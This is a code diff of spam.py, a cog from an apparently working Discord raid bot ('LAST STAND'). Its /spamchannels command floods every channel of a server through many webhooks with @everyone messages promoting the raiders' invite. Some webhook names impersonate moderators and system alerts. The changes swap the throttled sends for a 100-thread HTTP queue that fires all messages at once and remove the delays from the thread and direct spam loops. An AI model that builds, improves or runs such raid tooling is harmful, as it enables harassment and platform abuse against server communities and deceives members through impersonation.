@@ -1,12 +1,7 @@
 """
-spam.py — LAST STAND | /spamchannels: maximum webhook + mention flood across all channels.
-
-Bypass tech:
-  - 10 webhooks per channel with rotating identities
-  - Burst-wave delay pattern to evade rate-limit detectors
-  - Random message content — no repeated patterns
-  - Simultaneous thread spam alongside webhook spam
-  - @everyone / @here mention flood via direct messages
+spam.py — LAST STAND | /spamchannels: maximum webhook flood across all channels.
+Webhook message sending uses the 100-thread raw HTTP queue (c-realV2.py port)
+for simultaneous fire of all messages across all webhooks.
 """
 
 import asyncio
@@ -14,16 +9,16 @@ import random
 import string
 
 import discord
+import requests
 from discord import app_commands
 from discord.ext import commands
 
+from utils.http_queue import HttpQueue
 from utils.state import bot_state
 
 RAID_TAG   = "LAST STAND"
-RAID_SHORT = "LS"
 RAID_LINK  = "https://discord.gg/s59zWvzK6c"
-
-RAID_GIF = "https://cdn.discordapp.com/attachments/827289915388985404/1493954462580998236/EllenJoe.gif"
+RAID_GIF   = "https://cdn.discordapp.com/attachments/827289915388985404/1493954462580998236/EllenJoe.gif"
 
 SPAM_MSGS = [
     f"@everyone 💀 **RAIDED BY JEAN(LORENZO) FROM LAST STAND** 💀 {RAID_LINK}",
@@ -42,8 +37,8 @@ SPAM_MSGS = [
 ]
 
 WEBHOOK_NAMES = [
-    f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Bravo", f"{RAID_SHORT} Ghost",
-    f"{RAID_SHORT} Reaper", f"{RAID_SHORT} Phantom", f"{RAID_SHORT} Viper",
+    "LS Alpha", "LS Bravo", "LS Ghost",
+    "LS Reaper", "LS Phantom", "LS Viper",
     "Server Announcement", "Mod Alert", "System Notification",
     "AutoMod", "Security Alert", "JEAN(LORENZO)",
 ]
@@ -63,7 +58,7 @@ class Spam(commands.Cog):
 
     @app_commands.command(
         name="spamchannels",
-        description="💬 Maximum webhook flood across every channel with rotating identities.",
+        description="💬 Maximum webhook flood — 100-thread queue fires all messages simultaneously.",
     )
     @app_commands.describe(
         intensity="Speed 1–10. Default 10.",
@@ -95,7 +90,6 @@ class Spam(commands.Cog):
             return
 
         guild = interaction.guild
-        assert guild is not None
 
         channels = (
             [target_channel]
@@ -122,6 +116,7 @@ class Spam(commands.Cog):
             f"┣ Total messages : `~{total_messages}`\n"
             f"┣ Thread flood   : `{'✅' if thread_flood else '❌'}`\n"
             f"┣ Intensity      : `{intensity}/10`\n"
+            f"┣ Engine         : `100-thread raw HTTP queue`\n"
             f"┗ `/stop` halts immediately.",
         )
 
@@ -141,7 +136,7 @@ class Spam(commands.Cog):
                 return_exceptions=True,
             )
         except asyncio.CancelledError:
-            pass
+            HttpQueue.get().clear()
         finally:
             if bot_state.active_simulation == "spamchannels":
                 bot_state.active_simulation = None
@@ -151,6 +146,7 @@ class Spam(commands.Cog):
     ) -> None:
         sem = asyncio.Semaphore(SEM_WEBHOOK)
 
+        # create all webhooks concurrently via discord.py (we need the URL back)
         results = await asyncio.gather(
             *[self._create_webhook(channel, i, sem) for i in range(webhooks_per)],
             return_exceptions=True,
@@ -163,6 +159,7 @@ class Spam(commands.Cog):
         if not webhooks:
             tasks.append(self._direct_spam(channel, msgs_per))
         else:
+            # pump all webhooks via the raw HTTP queue simultaneously
             tasks.extend([self._pump_webhook(wh, msgs_per) for wh in webhooks])
 
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -186,28 +183,28 @@ class Spam(commands.Cog):
             pass
 
     async def _pump_webhook(self, webhook: discord.Webhook, count: int) -> None:
-        for i in range(count):
+        """Fire all `count` messages from this webhook via the 100-thread queue simultaneously."""
+        q = HttpQueue.get()
+        for _ in range(count):
             if bot_state.stop_event.is_set():
                 break
-            try:
-                await webhook.send(
-                    random.choice(SPAM_MSGS),
-                    username=random.choice(WEBHOOK_NAMES),
-                    allowed_mentions=discord.AllowedMentions(everyone=True),
-                )
-            except discord.HTTPException:
-                pass
-            delay = bot_state.rate_controller.get_burst_delay()
-            if delay > 0:
-                await asyncio.sleep(delay)
+            q.put_webhook(
+                webhook.url,
+                {
+                    "content": random.choice(SPAM_MSGS),
+                    "username": random.choice(WEBHOOK_NAMES),
+                    "allowed_mentions": {"parse": ["everyone", "roles"]},
+                },
+            )
+        await q.join()
 
     async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
         try:
             thread = await channel.create_thread(
-                name=f"{RAID_SHORT}-{_rand_str(5)}",
+                name=f"LS-{_rand_str(5)}",
                 type=discord.ChannelType.public_thread,
             )
-            for i in range(count):
+            for _ in range(count):
                 if bot_state.stop_event.is_set():
                     break
                 try:
@@ -217,14 +214,11 @@ class Spam(commands.Cog):
                     )
                 except discord.HTTPException:
                     pass
-                delay = bot_state.rate_controller.get_burst_delay()
-                if delay > 0:
-                    await asyncio.sleep(delay)
         except discord.HTTPException:
             pass
 
     async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
-        for i in range(count):
+        for _ in range(count):
             if bot_state.stop_event.is_set():
                 break
             try:
@@ -234,9 +228,6 @@ class Spam(commands.Cog):
                 )
             except discord.HTTPException:
                 pass
-            delay = bot_state.rate_controller.get_burst_delay()
-            if delay > 0:
-                await asyncio.sleep(delay)
 
     @spamchannels.error
     async def spamchannels_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
